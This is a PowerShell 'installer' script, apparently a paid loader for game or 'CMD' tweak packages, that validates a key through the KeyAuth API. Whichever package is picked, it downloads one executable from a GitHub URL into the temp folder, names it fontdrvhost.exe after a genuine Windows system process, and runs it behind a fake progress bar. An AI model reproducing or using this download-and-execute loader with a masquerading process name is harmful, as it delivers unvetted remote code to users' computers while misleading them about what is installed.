[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Clear-Host

# ===== KEYAUTH FUNCTION =====
function Check-KeyAuth($userKey) {

    $appname = "Smithshop all"
    $ownerid = "gw1rzpahob"
    $version = "1.0"

    try {
        # ===== INIT =====
        $initBody = @{
            type    = "init"
            name    = $appname
            ownerid = $ownerid
            version = $version
        }

        $init = Invoke-RestMethod -Uri "https://keyauth.win/api/1.2/" -Method Post -Body $initBody

        if ($init.success -ne $true) {
            Write-Host "❌ Init failed: $($init.message)" -ForegroundColor Red
            return $false
        }

        # ✅ เอา sessionid
        $sessionid = $init.sessionid

        # ===== LICENSE =====
        $licenseBody = @{
            type      = "license"
            key       = $userKey
            name      = $appname
            ownerid   = $ownerid
            sessionid = $sessionid
        }

        $res = Invoke-RestMethod -Uri "https://keyauth.win/api/1.2/" -Method Post -Body $licenseBody

        if ($res.success -eq $true) {
            return $true
        } else {
            Write-Host "❌ $($res.message)" -ForegroundColor Red
            return $false
        }

    } catch {
        Write-Host "❌ Connection error!" -ForegroundColor Red
        return $false
    }
}

# ===== CONFIG =====
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== LOADING =====
function Show-Loading($text) {

    $colors = @("Red","Yellow","Green","Cyan","Blue","Magenta")

    for ($i = 0; $i -le 100; $i++) {

        $dots = "." * ($i % 6)
        $color = $colors[$i % $colors.Count]

        $barLength = 20
        $filled = [math]::Floor($i / (100 / $barLength))
        $bar = ("#" * $filled).PadRight($barLength, "-")

        Write-Host "`r$text$dots [$bar] $i% " -NoNewline -ForegroundColor $color
        Start-Sleep -Milliseconds 40
    }

    Write-Host ""
}

# ===== MAIN MENU =====
Write-Host "=== CMDSMITHSHOP :] ===" -ForegroundColor Cyan
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

if ($choice -eq "1") {

    $userKey = Read-Host "Enter your Key"

    if (Check-KeyAuth $userKey) {

        Write-Host "✅ Key valid!" -ForegroundColor Green
        Start-Sleep 1

        while ($true) {

            Clear-Host
            Write-Host "=== SELECT CMD ===`n" -ForegroundColor Yellow
            Write-Host "1. smithx3d"
            Write-Host "2. uptoking"
            Write-Host "3. kingsmith"
            Write-Host "0. Exit"

            $package = Read-Host "Choose"

            switch ($package) {
                "1" { $pkgName = "smithx3d" }
                "2" { $pkgName = "uptoking" }
                "3" { $pkgName = "kingsmith" }
                "0" { break }
                default {
                    Write-Host "❌ Invalid!" -ForegroundColor Red
                    Start-Sleep 1
                    continue
                }
            }

            Clear-Host
            Write-Host "=== INSTALL MODE ===`n" -ForegroundColor Green

            Show-Loading "install $pkgName "

            Invoke-WebRequest $ExeURL -OutFile $ExeOutput
            Start-Process $ExeOutput

            Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
            Start-Sleep 2
        }

    } else {
        Pause
        exit
    }

}
elseif ($choice -eq "2") {

    Clear-Host
    Write-Host "=== CLEAN MODE ===`n" -ForegroundColor Red

    Show-Loading "cleaning "

    if (Test-Path $ExeOutput) {
        Remove-Item $ExeOutput -Force
        Write-Host "`nFile removed successfully ✅"
    } else {
        Write-Host "`nFile not found ⚠️"
    }

}
else {
    Write-Host "Invalid choice ⚠️"
}

Pause
